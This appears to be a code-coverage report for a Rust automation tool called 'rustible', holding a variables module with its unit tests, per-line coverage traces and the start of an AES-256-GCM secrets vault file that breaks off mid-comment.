=\u003e None,\n            },\n            serde_yaml::Value::Number(n) =\u003e n.as_i64().map(|i| i != 0),\n            _ =\u003e None,\n        }\n    }\n\n    /// Convert a value to integer\n    pub fn to_int(value: \u0026serde_yaml::Value) -\u003e Option\u003ci64\u003e {\n        match value {\n            serde_yaml::Value::Number(n) =\u003e n.as_i64(),\n            serde_yaml::Value::String(s) =\u003e s.parse().ok(),\n            serde_yaml::Value::Bool(b) =\u003e Some(if *b { 1 } else { 0 }),\n            _ =\u003e None,\n        }\n    }\n\n    /// Convert a value to float\n    pub fn to_float(value: \u0026serde_yaml::Value) -\u003e Option\u003cf64\u003e {\n        match value {\n            serde_yaml::Value::Number(n) =\u003e n.as_f64(),\n            serde_yaml::Value::String(s) =\u003e s.parse().ok(),\n            _ =\u003e None,\n        }\n    }\n\n    /// Convert a value to list\n    pub fn to_list(value: \u0026serde_yaml::Value) -\u003e Vec\u003cserde_yaml::Value\u003e {\n        match value {\n            serde_yaml::Value::Sequence(seq) =\u003e seq.clone(),\n            serde_yaml::Value::String(s) =\u003e s\n                .split(',')\n                .map(|s| serde_yaml::Value::String(s.trim().to_string()))\n                .collect(),\n            _ =\u003e vec![value.clone()],\n        }\n    }\n}\n\n/// Legacy Variables type for backward compatibility\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\n#[serde(transparent)]\npub struct Variables {\n    data: IndexMap\u003cString, serde_json::Value\u003e,\n}\n\nimpl Variables {\n    /// Create new empty variables\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set a variable\n    pub fn set(\u0026mut self, key: impl Into\u003cString\u003e, value: serde_json::Value) {\n        self.data.insert(key.into(), value);\n    }\n\n    /// Get a variable\n    pub fn get(\u0026self, key: \u0026str) -\u003e Option\u003c\u0026serde_json::Value\u003e {\n        self.data.get(key)\n    }\n\n    /// Check if variable exists\n    pub fn contains(\u0026self, key: \u0026str) -\u003e bool {\n        self.data.contains_key(key)\n    }\n\n    /// Merge with another variables set (other takes precedence)\n    pub fn merge(\u0026mut self, other: \u0026Variables) {\n        for (k, v) in \u0026other.data {\n            self.data.insert(k.clone(), v.clone());\n        }\n    }\n\n    /// Get all variables as a map\n    pub fn as_map(\u0026self) -\u003e \u0026IndexMap\u003cString, serde_json::Value\u003e {\n        \u0026self.data\n    }\n\n    /// Check if variables is empty\n    pub fn is_empty(\u0026self) -\u003e bool {\n        self.data.is_empty()\n    }\n\n    /// Get the number of variables\n    pub fn len(\u0026self) -\u003e usize {\n        self.data.len()\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_precedence_order() {\n        assert!(VarPrecedence::ExtraVars \u003e VarPrecedence::RoleDefaults);\n        assert!(VarPrecedence::PlayVars \u003e VarPrecedence::InventoryGroupVars);\n    }\n\n    #[test]\n    fn test_var_store_basic() {\n        let mut store = VarStore::new();\n\n        store.set(\n            \"test\",\n            serde_yaml::Value::String(\"value\".to_string()),\n            VarPrecedence::PlayVars,\n        );\n\n        assert!(store.contains(\"test\"));\n        assert_eq!(\n            store.get(\"test\"),\n            Some(\u0026serde_yaml::Value::String(\"value\".to_string()))\n        );\n    }\n\n    #[test]\n    fn test_var_store_precedence() {\n        let mut store = VarStore::new();\n\n        // Set at lower precedence\n        store.set(\n            \"var\",\n            serde_yaml::Value::String(\"low\".to_string()),\n            VarPrecedence::RoleDefaults,\n        );\n\n        // Set at higher precedence\n        store.set(\n            \"var\",\n            serde_yaml::Value::String(\"high\".to_string()),\n            VarPrecedence::ExtraVars,\n        );\n\n        // Higher precedence wins\n        assert_eq!(\n            store.get(\"var\"),\n            Some(\u0026serde_yaml::Value::String(\"high\".to_string()))\n        );\n    }\n\n    #[test]\n    fn test_deep_merge() {\n        let base = serde_yaml::from_str::\u003cserde_yaml::Value\u003e(\n            r#\"\n            a: 1\n            b:\n              c: 2\n              d: 3\n            \"#,\n        )\n        .unwrap();\n\n        let overlay = serde_yaml::from_str::\u003cserde_yaml::Value\u003e(\n            r#\"\n            b:\n              c: 4\n              e: 5\n            f: 6\n            \"#,\n        )\n        .unwrap();\n\n        let merged = deep_merge(\u0026base, \u0026overlay);\n\n        // Check values\n        assert_eq!(\n            resolve::resolve_path(\u0026merged, \"a\"),\n            Some(\u0026serde_yaml::Value::Number(1.into()))\n        );\n        assert_eq!(\n            resolve::resolve_path(\u0026merged, \"b.c\"),\n            Some(\u0026serde_yaml::Value::Number(4.into())) // Overwritten\n        );\n        assert_eq!(\n            resolve::resolve_path(\u0026merged, \"b.d\"),\n            Some(\u0026serde_yaml::Value::Number(3.into())) // Preserved\n        );\n        assert_eq!(\n            resolve::resolve_path(\u0026merged, \"b.e\"),\n            Some(\u0026serde_yaml::Value::Number(5.into())) // Added\n        );\n    }\n\n    #[test]\n    fn test_resolve_path() {\n        let value = serde_yaml::from_str::\u003cserde_yaml::Value\u003e(\n            r#\"\n            a:\n              b:\n                c: \"deep\"\n            list:\n              - one\n              - two\n            \"#,\n        )\n        .unwrap();\n\n        assert_eq!(\n            resolve::resolve_path(\u0026value, \"a.b.c\"),\n            Some(\u0026serde_yaml::Value::String(\"deep\".to_string()))\n        );\n        assert_eq!(\n            resolve::resolve_path(\u0026value, \"list.0\"),\n            Some(\u0026serde_yaml::Value::String(\"one\".to_string()))\n        );\n    }\n\n    #[test]\n    fn test_var_scope() {\n        let mut store = VarStore::new();\n        store.set(\n            \"a\",\n            serde_yaml::Value::Number(1.into()),\n            VarPrecedence::PlayVars,\n        );\n\n        let mut scope = store.scope();\n        scope.set(\"b\", serde_yaml::Value::Number(2.into()));\n\n        assert_eq!(scope.get(\"a\"), Some(\u0026serde_yaml::Value::Number(1.into())));\n        assert_eq!(scope.get(\"b\"), Some(\u0026serde_yaml::Value::Number(2.into())));\n\n        // Parent doesn't see scope variables\n        assert!(!store.contains(\"b\"));\n    }\n}\n","traces":[{"line":69,"address":[30602128],"length":1,"stats":{"Line":1}},{"line":96,"address":[30602272],"length":1,"stats":{"Line":0}},{"line":97,"address":[30602277],"length":1,"stats":{"Line":0}},{"line":102,"address":[30600288],"length":1,"stats":{"Line":0}},{"line":103,"address":[30600309],"length":1,"stats":{"Line":0}},{"line":104,"address":[30600344],"length":1,"stats":{"Line":0}},{"line":105,"address":[30600370],"length":1,"stats":{"Line":0}},{"line":106,"address":[30600396],"length":1,"stats":{"Line":0}},{"line":107,"address":[30600422],"length":1,"stats":{"Line":0}},{"line":108,"address":[30600448],"length":1,"stats":{"Line":0}},{"line":109,"address":[30600474],"length":1,"stats":{"Line":0}},{"line":110,"address":[30600500],"length":1,"stats":{"Line":0}},{"line":111,"address":[30600526],"length":1,"stats":{"Line":0}},{"line":112,"address":[30600552],"length":1,"stats":{"Line":0}},{"line":113,"address":[30600578],"length":1,"stats":{"Line":0}},{"line":114,"address":[30600604],"length":1,"stats":{"Line":0}},{"line":115,"address":[30600630],"length":1,"stats":{"Line":0}},{"line":116,"address":[30600656],"length":1,"stats":{"Line":0}},{"line":117,"address":[30600682],"length":1,"stats":{"Line":0}},{"line":118,"address":[30600708],"length":1,"stats":{"Line":0}},{"line":119,"address":[30600731],"length":1,"stats":{"Line":0}},{"line":120,"address":[30600754],"length":1,"stats":{"Line":0}},{"line":121,"address":[30600777],"length":1,"stats":{"Line":0}},{"line":122,"address":[30600800],"length":1,"stats":{"Line":0}},{"line":123,"address":[30600823],"length":1,"stats":{"Line":0}},{"line":125,"address":[30600844],"length":1,"stats":{"Line":0}},{"line":184,"address":[30615920],"length":1,"stats":{"Line":1}},{"line":202,"address":[],"length":0,"stats":{"Line":0}},{"line":208,"address":[30616032],"length":1,"stats":{"Line":0}},{"line":209,"address":[30616040],"length":1,"stats":{"Line":0}},{"line":210,"address":[30616044],"length":1,"stats":{"Line":0}},{"line":242,"address":[30614320],"length":1,"stats":{"Line":1}},{"line":244,"address":[30614337],"length":1,"stats":{"Line":1}},{"line":252,"address":[30613952],"length":1,"stats":{"Line":0}},{"line":260,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":265,"address":[24871714,24871072,24871680],"length":1,"stats":{"Line":1}},{"line":271,"address":[24871137],"length":1,"stats":{"Line":1}},{"line":273,"address":[24871296,24871367],"length":1,"stats":{"Line":2}},{"line":274,"address":[24871402,24871658],"length":1,"stats":{"Line":1}},{"line":278,"address":[],"length":0,"stats":{"Line":0}},{"line":279,"address":[],"length":0,"stats":{"Line":0}},{"line":281,"address":[],"length":0,"stats":{"Line":0}},{"line":282,"address":[],"length":0,"stats":{"Line":0}},{"line":286,"address":[30615889,30615024],"length":1,"stats":{"Line":0}},{"line":291,"address":[30615062],"length":1,"stats":{"Line":0}},{"line":293,"address":[30615205,30615270],"length":1,"stats":{"Line":0}},{"line":294,"address":[30615515,30615298],"length":1,"stats":{"Line":0}},{"line":295,"address":[30615761,30615672],"length":1,"stats":{"Line":0}},{"line":306,"address":[],"length":0,"stats":{"Line":0}},{"line":308,"address":[],"length":0,"stats":{"Line":0}},{"line":309,"address":[],"length":0,"stats":{"Line":0}},{"line":311,"address":[],"length":0,"stats":{"Line":0}},{"line":312,"address":[],"length":0,"stats":{"Line":0}},{"line":317,"address":[30614176],"length":1,"stats":{"Line":1}},{"line":318,"address":[30614210],"length":1,"stats":{"Line":1}},{"line":319,"address":[24870992,24871027],"length":1,"stats":{"Line":3}},{"line":323,"address":[30612016,30612548,30612542],"length":1,"stats":{"Line":1}},{"line":325,"address":[30612259,30612062],"length":1,"stats":{"Line":2}},{"line":326,"address":[30612312,30612376],"length":1,"stats":{"Line":2}},{"line":327,"address":[30612445],"length":1,"stats":{"Line":1}},{"line":328,"address":[30612519],"length":1,"stats":{"Line":1}},{"line":332,"address":[30612349],"length":1,"stats":{"Line":0}},{"line":336,"address":[30614944],"length":1,"stats":{"Line":1}},{"line":337,"address":[30614963],"length":1,"stats":{"Line":1}},{"line":341,"address":[30614720,30614833],"length":1,"stats":{"Line":0}},{"line":342,"address":[30614873,30614818,30614801],"length":1,"stats":{"Line":0}},{"line":344,"address":[30614893],"length":1,"stats":{"Line":0}},{"line":345,"address":[30614897],"length":1,"stats":{"Line":0}},{"line":346,"address":[30614925],"length":1,"stats":{"Line":0}},{"line":350,"address":[30613776,30613843],"length":1,"stats":{"Line":0}},{"line":351,"address":[30613882,30613812,30613828],"length":1,"stats":{"Line":0}},{"line":352,"address":[30613901],"length":1,"stats":{"Line":0}},{"line":356,"address":[30614560,30614614],"length":1,"stats":{"Line":0}},{"line":357,"address":[30614644,30614583,30614599],"length":1,"stats":{"Line":0}},{"line":358,"address":[30614663],"length":1,"stats":{"Line":0}},{"line":362,"address":[30613744],"length":1,"stats":{"Line":0}},{"line":363,"address":[30613749],"length":1,"stats":{"Line":0}},{"line":367,"address":[30613760],"length":1,"stats":{"Line":0}},{"line":368,"address":[30613765],"length":1,"stats":{"Line":0}},{"line":372,"address":[30614112],"length":1,"stats":{"Line":0}},{"line":373,"address":[30614126],"length":1,"stats":{"Line":0}},{"line":374,"address":[30614136],"length":1,"stats":{"Line":0}},{"line":378,"address":[30614496],"length":1,"stats":{"Line":0}},{"line":379,"address":[30614510],"length":1,"stats":{"Line":0}},{"line":380,"address":[30614520],"length":1,"stats":{"Line":0}},{"line":384,"address":[30613698,30613704,30612832],"length":1,"stats":{"Line":1}},{"line":385,"address":[30612852],"length":1,"stats":{"Line":1}},{"line":389,"address":[30612869],"length":1,"stats":{"Line":1}},{"line":392,"address":[30613060,30612895,30612967],"length":1,"stats":{"Line":3}},{"line":393,"address":[30613113,30613417],"length":1,"stats":{"Line":2}},{"line":394,"address":[30613476],"length":1,"stats":{"Line":1}},{"line":395,"address":[30613641],"length":1,"stats":{"Line":1}},{"line":400,"address":[30613331,30613160],"length":1,"stats":{"Line":1}},{"line":404,"address":[30611168,30611497,30611526],"length":1,"stats":{"Line":1}},{"line":410,"address":[30611235],"length":1,"stats":{"Line":1}},{"line":412,"address":[30611356,30611510,30611398],"length":1,"stats":{"Line":1}},{"line":415,"address":[30611293,30611853,30611537],"length":1,"stats":{"Line":0}},{"line":416,"address":[30611553],"length":1,"stats":{"Line":0}},{"line":417,"address":[30611707,30611584],"length":1,"stats":{"Line":0}},{"line":419,"address":[30611880,30611613],"length":1,"stats":{"Line":0}},{"line":431,"address":[],"length":0,"stats":{"Line":0}},{"line":434,"address":[],"length":0,"stats":{"Line":0}},{"line":435,"address":[],"length":0,"stats":{"Line":0}},{"line":436,"address":[],"length":0,"stats":{"Line":0}},{"line":437,"address":[],"length":0,"stats":{"Line":0}},{"line":439,"address":[],"length":0,"stats":{"Line":0}},{"line":440,"address":[],"length":0,"stats":{"Line":0}},{"line":443,"address":[],"length":0,"stats":{"Line":0}},{"line":447,"address":[30612576],"length":1,"stats":{"Line":0}},{"line":448,"address":[30612662,30612639,30612739],"length":1,"stats":{"Line":0}},{"line":451,"address":[30612711,30612652],"length":1,"stats":{"Line":0}},{"line":453,"address":[30612774],"length":1,"stats":{"Line":0}},{"line":457,"address":[30614688],"length":1,"stats":{"Line":1}},{"line":458,"address":[30614705],"length":1,"stats":{"Line":1}},{"line":462,"address":[30614256],"length":1,"stats":{"Line":0}},{"line":463,"address":[30614270],"length":1,"stats":{"Line":0}},{"line":464,"address":[30614280],"length":1,"stats":{"Line":0}},{"line":468,"address":[30614992],"length":1,"stats":{"Line":0}},{"line":469,"address":[30614997],"length":1,"stats":{"Line":0}},{"line":485,"address":[30610720],"length":1,"stats":{"Line":1}},{"line":488,"address":[30610743],"length":1,"stats":{"Line":1}},{"line":493,"address":[24870847,24870876,24870608],"length":1,"stats":{"Line":1}},{"line":494,"address":[24870737,24870648],"length":1,"stats":{"Line":2}},{"line":498,"address":[30611138,30610800],"length":1,"stats":{"Line":0}},{"line":499,"address":[30610820,30610924],"length":1,"stats":{"Line":0}},{"line":500,"address":[30611091,30611116],"length":1,"stats":{"Line":0}},{"line":505,"address":[30610624],"length":1,"stats":{"Line":1}},{"line":506,"address":[],"length":0,"stats":{"Line":0}},{"line":507,"address":[30610657],"length":1,"stats":{"Line":1}},{"line":508,"address":[24870560,24870564,24870600,24870592],"length":1,"stats":{"Line":5}},{"line":512,"address":[30610603,30610180,30609472],"length":1,"stats":{"Line":0}},{"line":513,"address":[30609502],"length":1,"stats":{"Line":0}},{"line":516,"address":[30609695,30609602,30609539],"length":1,"stats":{"Line":0}},{"line":517,"address":[30609748,30610191],"length":1,"stats":{"Line":0}},{"line":518,"address":[30610250],"length":1,"stats":{"Line":0}},{"line":519,"address":[30610467,30610416],"length":1,"stats":{"Line":0}},{"line":525,"address":[30609799],"length":1,"stats":{"Line":0}},{"line":526,"address":[30609961,30610044,30610021],"length":1,"stats":{"Line":0}},{"line":529,"address":[30609985],"length":1,"stats":{"Line":0}},{"line":534,"address":[30601152,30602108,30601941],"length":1,"stats":{"Line":1}},{"line":535,"address":[30601195],"length":1,"stats":{"Line":1}},{"line":536,"address":[30601348],"length":1,"stats":{"Line":1}},{"line":537,"address":[30601369],"length":1,"stats":{"Line":1}},{"line":538,"address":[30601447,30601379],"length":1,"stats":{"Line":2}},{"line":539,"address":[30601672,30601592],"length":1,"stats":{"Line":2}},{"line":540,"address":[30601745,30601808,30601785],"length":1,"stats":{"Line":2}},{"line":542,"address":[30601975,30601952,30601765],"length":1,"stats":{"Line":2}},{"line":545,"address":[30601608],"length":1,"stats":{"Line":1}},{"line":548,"address":[30601320],"length":1,"stats":{"Line":1}},{"line":560,"address":[30609434,30609456,30607456],"length":1,"stats":{"Line":0}},{"line":562,"address":[30607540],"length":1,"stats":{"Line":0}},{"line":563,"address":[30607561],"length":1,"stats":{"Line":0}},{"line":565,"address":[30607736,30607653],"length":1,"stats":{"Line":0}},{"line":566,"address":[30607585],"length":1,"stats":{"Line":0}},{"line":567,"address":[24870206,24870192],"length":1,"stats":{"Line":0}},{"line":569,"address":[30607787,30607917,30607841],"length":1,"stats":{"Line":0}},{"line":571,"address":[24870464,24870478],"length":1,"stats":{"Line":0}},{"line":574,"address":[30607998],"length":1,"stats":{"Line":0}},{"line":575,"address":[30608055,30608090,30608160],"length":1,"stats":{"Line":0}},{"line":576,"address":[24870381,24870368],"length":1,"stats":{"Line":0}},{"line":580,"address":[30608255],"length":1,"stats":{"Line":0}},{"line":581,"address":[30608278],"length":1,"stats":{"Line":0}},{"line":582,"address":[30608367],"length":1,"stats":{"Line":0}},{"line":585,"address":[30608496,30608593],"length":1,"stats":{"Line":0}},{"line":586,"address":[30608402],"length":1,"stats":{"Line":0}},{"line":587,"address":[30608473,30608545],"length":1,"stats":{"Line":0}},{"line":591,"address":[30608682,30608765],"length":1,"stats":{"Line":0}},{"line":592,"address":[30608784],"length":1,"stats":{"Line":0}},{"line":593,"address":[30608855],"length":1,"stats":{"Line":0}},{"line":596,"address":[30608926,30609060],"length":1,"stats":{"Line":0}},{"line":604,"address":[30609294],"length":1,"stats":{"Line":0}},{"line":608,"address":[30604128,30607442,30607350],"length":1,"stats":{"Line":0}},{"line":609,"address":[30604226],"length":1,"stats":{"Line":0}},{"line":611,"address":[30604363,30604292],"length":1,"stats":{"Line":0}},{"line":612,"address":[30604415],"length":1,"stats":{"Line":0}},{"line":616,"address":[30604369,30604464],"length":1,"stats":{"Line":0}},{"line":617,"address":[30604522],"length":1,"stats":{"Line":0}},{"line":621,"address":[30604560,30604626],"length":1,"stats":{"Line":0}},{"line":622,"address":[30607437,30604649],"length":1,"stats":{"Line":0}},{"line":625,"address":[30607432,30605086,30605186],"length":1,"stats":{"Line":0}},{"line":626,"address":[30604971],"length":1,"stats":{"Line":0}},{"line":627,"address":[24869907,24869904],"length":1,"stats":{"Line":0}},{"line":629,"address":[30607430,30605570,30605470],"length":1,"stats":{"Line":0}},{"line":630,"address":[30605275,30605372],"length":1,"stats":{"Line":0}},{"line":631,"address":[24870080,24870083],"length":1,"stats":{"Line":0}},{"line":634,"address":[30605659],"length":1,"stats":{"Line":0}},{"line":635,"address":[30605925,30607406,30605835],"length":1,"stats":{"Line":0}},{"line":636,"address":[30605738],"length":1,"stats":{"Line":0}},{"line":637,"address":[30605812,30605877],"length":1,"stats":{"Line":0}},{"line":639,"address":[30606099,30605980,30606182,30607404],"length":1,"stats":{"Line":0}},{"line":641,"address":[30606076,30606134],"length":1,"stats":{"Line":0}},{"line":644,"address":[30606367],"length":1,"stats":{"Line":0}},{"line":645,"address":[30606523,30606465,30607402,30606600],"length":1,"stats":{"Line":0}},{"line":646,"address":[30606500,30606552],"length":1,"stats":{"Line":0}},{"line":648,"address":[30606778,30606695],"length":1,"stats":{"Line":0}},{"line":650,"address":[30606909,30607009],"length":1,"stats":{"Line":0}},{"line":651,"address":[30606803],"length":1,"stats":{"Line":0}},{"line":652,"address":[30606961,30606886],"length":1,"stats":{"Line":0}},{"line":654,"address":[30607226,30607106],"length":1,"stats":{"Line":0}},{"line":658,"address":[30604064],"length":1,"stats":{"Line":0}},{"line":659,"address":[30604078],"length":1,"stats":{"Line":0}},{"line":663,"address":[],"length":0,"stats":{"Line":0}},{"line":664,"address":[],"length":0,"stats":{"Line":0}},{"line":666,"address":[],"length":0,"stats":{"Line":0}},{"line":667,"address":[],"length":0,"stats":{"Line":0}},{"line":668,"address":[],"length":0,"stats":{"Line":0}},{"line":672,"address":[],"length":0,"stats":{"Line":0}},{"line":673,"address":[],"length":0,"stats":{"Line":0}},{"line":675,"address":[],"length":0,"stats":{"Line":0}},{"line":679,"address":[],"length":0,"stats":{"Line":0}},{"line":680,"address":[],"length":0,"stats":{"Line":0}},{"line":682,"address":[],"length":0,"stats":{"Line":0}},{"line":683,"address":[],"length":0,"stats":{"Line":0}},{"line":686,"address":[],"length":0,"stats":{"Line":0}},{"line":687,"address":[],"length":0,"stats":{"Line":0}},{"line":689,"address":[],"length":0,"stats":{"Line":0}},{"line":693,"address":[],"length":0,"stats":{"Line":0}},{"line":694,"address":[],"length":0,"stats":{"Line":0}},{"line":695,"address":[],"length":0,"stats":{"Line":0}},{"line":703,"address":[30604050,30602288,30604044],"length":1,"stats":{"Line":0}},{"line":707,"address":[30602344],"length":1,"stats":{"Line":0}},{"line":708,"address":[30602481],"length":1,"stats":{"Line":0}},{"line":709,"address":[30602747],"length":1,"stats":{"Line":0}},{"line":710,"address":[30602821],"length":1,"stats":{"Line":0}},{"line":711,"address":[30602986],"length":1,"stats":{"Line":0}},{"line":713,"address":[30602701],"length":1,"stats":{"Line":0}},{"line":714,"address":[30602717],"length":1,"stats":{"Line":0}},{"line":715,"address":[30602727,30603332],"length":1,"stats":{"Line":0}},{"line":716,"address":[30603475,30604022,30603577,30603909],"length":1,"stats":{"Line":0}},{"line":718,"address":[30603482],"length":1,"stats":{"Line":0}},{"line":720,"address":[30602552],"length":1,"stats":{"Line":0}},{"line":721,"address":[30602564],"length":1,"stats":{"Line":0}},{"line":723,"address":[30602595],"length":1,"stats":{"Line":0}},{"line":725,"address":[30602629,30603083],"length":1,"stats":{"Line":0}},{"line":727,"address":[30602435],"length":1,"stats":{"Line":0}},{"line":737,"address":[25774448,25775690,25775696],"length":1,"stats":{"Line":1}},{"line":741,"address":[25774487],"length":1,"stats":{"Line":1}},{"line":742,"address":[25774536],"length":1,"stats":{"Line":1}},{"line":744,"address":[25774544,25774725],"length":1,"stats":{"Line":2}},{"line":745,"address":[25774820],"length":1,"stats":{"Line":1}},{"line":746,"address":[25775030],"length":1,"stats":{"Line":1}},{"line":747,"address":[25775420,25775051],"length":1,"stats":{"Line":2}},{"line":749,"address":[25774970],"length":1,"stats":{"Line":1}},{"line":750,"address":[25775405,25775073,25774995],"length":1,"stats":{"Line":2}},{"line":751,"address":[25775214,25775373],"length":1,"stats":{"Line":1}},{"line":753,"address":[25774937],"length":1,"stats":{"Line":0}},{"line":757,"address":[25774905],"length":1,"stats":{"Line":1}},{"line":761,"address":[25778504,25777184,25778889],"length":1,"stats":{"Line":0}},{"line":766,"address":[25777231,25777315],"length":1,"stats":{"Line":0}},{"line":768,"address":[25777342,25777416],"length":1,"stats":{"Line":0}},{"line":769,"address":[25777467],"length":1,"stats":{"Line":0}},{"line":772,"address":[25777430],"length":1,"stats":{"Line":0}},{"line":774,"address":[25777490,25777438],"length":1,"stats":{"Line":0}},{"line":775,"address":[25777743,25777830,25777882],"length":1,"stats":{"Line":0}},{"line":777,"address":[25777876],"length":1,"stats":{"Line":0}},{"line":778,"address":[25777959,25778596],"length":1,"stats":{"Line":0}},{"line":779,"address":[25778769],"length":1,"stats":{"Line":0}},{"line":780,"address":[25778617,25778654],"length":1,"stats":{"Line":0}},{"line":781,"address":[25778720],"length":1,"stats":{"Line":0}},{"line":783,"address":[25778835],"length":1,"stats":{"Line":0}},{"line":785,"address":[25778636],"length":1,"stats":{"Line":0}},{"line":789,"address":[25778028,25777902],"length":1,"stats":{"Line":0}},{"line":790,"address":[25778049,25778086],"length":1,"stats":{"Line":0}},{"line":791,"address":[25778144,25778203],"length":1,"stats":{"Line":0}},{"line":792,"address":[25778413],"length":1,"stats":{"Line":0}},{"line":793,"address":[25778264,25778225],"length":1,"stats":{"Line":0}},{"line":794,"address":[25778333,25778280],"length":1,"stats":{"Line":0}},{"line":797,"address":[25778237,25778515],"length":1,"stats":{"Line":0}},{"line":799,"address":[25778068],"length":1,"stats":{"Line":0}},{"line":803,"address":[25777767],"length":1,"stats":{"Line":0}},{"line":807,"address":[25779104],"length":1,"stats":{"Line":0}},{"line":808,"address":[25779127],"length":1,"stats":{"Line":0}},{"line":809,"address":[25779226],"length":1,"stats":{"Line":0}},{"line":810,"address":[25779242],"length":1,"stats":{"Line":0}},{"line":811,"address":[25779268],"length":1,"stats":{"Line":0}},{"line":812,"address":[25779293],"length":1,"stats":{"Line":0}},{"line":813,"address":[25779194],"length":1,"stats":{"Line":0}},{"line":818,"address":[25776707,25775984,25776713],"length":1,"stats":{"Line":0}},{"line":819,"address":[25776001],"length":1,"stats":{"Line":0}},{"line":820,"address":[25776086],"length":1,"stats":{"Line":0}},{"line":821,"address":[25776274,25776150],"length":1,"stats":{"Line":0}},{"line":822,"address":[25776290],"length":1,"stats":{"Line":0}},{"line":823,"address":[25776472],"length":1,"stats":{"Line":0}},{"line":824,"address":[25776686],"length":1,"stats":{"Line":0}},{"line":826,"address":[29723957,29723952],"length":1,"stats":{"Line":0}},{"line":827,"address":[25776071],"length":1,"stats":{"Line":0}},{"line":832,"address":[25775712],"length":1,"stats":{"Line":0}},{"line":833,"address":[25775725],"length":1,"stats":{"Line":0}},{"line":834,"address":[25775837],"length":1,"stats":{"Line":0}},{"line":835,"address":[25775867],"length":1,"stats":{"Line":0}},{"line":836,"address":[25775813,25775918],"length":1,"stats":{"Line":0}},{"line":837,"address":[25775795],"length":1,"stats":{"Line":0}},{"line":842,"address":[25778912],"length":1,"stats":{"Line":0}},{"line":843,"address":[25778925],"length":1,"stats":{"Line":0}},{"line":844,"address":[25778997],"length":1,"stats":{"Line":0}},{"line":845,"address":[25779028],"length":1,"stats":{"Line":0}},{"line":846,"address":[25778982],"length":1,"stats":{"Line":0}},{"line":851,"address":[25777155,25777161,25776736],"length":1,"stats":{"Line":0}},{"line":852,"address":[25776766],"length":1,"stats":{"Line":0}},{"line":853,"address":[25776952],"length":1,"stats":{"Line":0}},{"line":854,"address":[25776874],"length":1,"stats":{"Line":0}},{"line":856,"address":[29723968,29724023],"length":1,"stats":{"Line":0}},{"line":858,"address":[25776991,25776833],"length":1,"stats":{"Line":0}},{"line":872,"address":[30616112],"length":1,"stats":{"Line":0}},{"line":873,"address":[30616120],"length":1,"stats":{"Line":0}},{"line":877,"address":[],"length":0,"stats":{"Line":0}},{"line":878,"address":[],"length":0,"stats":{"Line":0}},{"line":882,"address":[30616064],"length":1,"stats":{"Line":0}},{"line":883,"address":[30616082],"length":1,"stats":{"Line":0}},{"line":887,"address":[30616480],"length":1,"stats":{"Line":0}},{"line":888,"address":[30616498],"length":1,"stats":{"Line":0}},{"line":892,"address":[30616144,30616454,30616425],"length":1,"stats":{"Line":0}},{"line":893,"address":[30616208,30616185],"length":1,"stats":{"Line":0}},{"line":894,"address":[30616286,30616332,30616438],"length":1,"stats":{"Line":0}},{"line":899,"address":[30616464],"length":1,"stats":{"Line":0}},{"line":904,"address":[30616512],"length":1,"stats":{"Line":0}},{"line":905,"address":[30616517],"length":1,"stats":{"Line":0}},{"line":909,"address":[30616096],"length":1,"stats":{"Line":0}},{"line":910,"address":[30616101],"length":1,"stats":{"Line":0}}],"covered":59,"coverable":320},{"path":["/","home","artur","Repositories","rustible","src","vault.rs"],"content":"//! Vault for encrypted secrets management\n\nuse crate::error::{Error, Result};\nuse aes_gcm::aead::generic_array::typenum;\nuse aes_gcm::{\n    aead::{generic_array::GenericArray, Aead},\n    Aes256Gcm, KeyInit,\n};\nuse argon2::password_hash::SaltString;\nuse argon2::Argon2;\nuse base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};\nuse rand::rngs::OsRng;\n\n/// Vault header marker\nconst VAULT_HEADER: \u0026str = \"$RUSTIBLE_VAULT;1.0;AES256\";\n\n/// Vault for encrypting/decrypting secrets\npub struct Vault {\n    password: String,\n}\n\nimpl Vault {\n    /// Create a new vault with password\n    pub fn new(password: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            password: password.into(),\n        }\n    }\n\n    /// Encrypt content\n    pub fn encrypt(\u0026self, content: \u0026str) -\u003e Result\u003cString\u003e {\n        let salt = SaltString::generate(\u0026mut OsRng);\n        let key = self.derive_key(\u0026salt)?;\n\n        let cipher = Aes256Gcm::new(\u0026key);\n        use rand::RngCore;\n        let mut nonce_bytes = [0u8; 12];\n        OsRng.fill_bytes(\u0026mut nonce_bytes);\n        let nonce = GenericArray::from_slice(\u0026nonce_bytes);\n\n        let ciphertext = cipher\n            .encrypt(nonce, content.as_bytes())\n            .map_err(|e| Error::Vault(format!(\"Encryption failed: {}\", e)))?;\n\n        let mut encrypted = Vec::new();\n        encrypted.extend_from_slice(salt.as_str().as_bytes());\n        encrypted.push(b'\\n');\n        encrypted.extend_from_slice(\u0026nonce_bytes);\n        encrypted.extend_from_slice(\u0026ciphertext);\n\n        Ok(format!(\"{}\\n{}\", VAULT_HEADER, BASE64.encode(\u0026encrypted)))\n    }\n\n    /// Decrypt content\n    pub fn decrypt(\u0026self, content: \u0026str) -\u003e Result\u003cString\u003e {\n        let lines: Vec\u003c\u0026str\u003e = content.lines().collect();\n        if lines.is_empty() || !lines[0].starts_with(\"$RUSTIBLE_VAULT\") {\n            return Err(Error::Vault(\"Invalid vault format\".into()));\n        }\n\n        let encrypted = BASE64\n            .decode(lines[1..].join(\"\"))\n            .map_err(|e| Error::Vault(format!(\"Base64 decode failed: {}\", e)))?;\n\n        // Parse salt, nonce, and ciphertext\n        let salt_end = encrypted\n            .iter()\n            .position(|\u0026b| b == b'\\n')\n            .ok_or_else(|| Error::Vault(\"Invalid vault format\".into()))?;\n        let salt_str = std::str::from_utf8(\u0026encrypted[..salt_end])\n            .map_err(|_| Error::Vault(\"Invalid salt\".into()))?;\n        let salt =\n            SaltString::from_b64(salt_str).map_err(|_| Error::Vault(\"Invalid salt\".into()))?;\n\n        let nonce_start = salt_end + 1;\n        let nonce = GenericArray::from_slice(\u0026encrypted[nonce_start..nonce_start + 12]);\n        let ciphertext = \u0026encrypted[nonce_start + 12..];\n\n        let key = self.derive_key(\u0026salt)?;\n        let cipher = Aes256Gcm::new(\u0026key);\n\n        let plaintext = cipher\n            .decrypt(nonce, ciphertext)\n            .map_err(|_| Error::Vault(\"Decryption failed - wrong password?\".into()))?;\n\n        String::from_utf8(plaintext)\n            .map_err(|_| Error::Vault(\"Invalid UTF-8 in decrypted content\".into()))\n    }\n\n    /// Check if content is 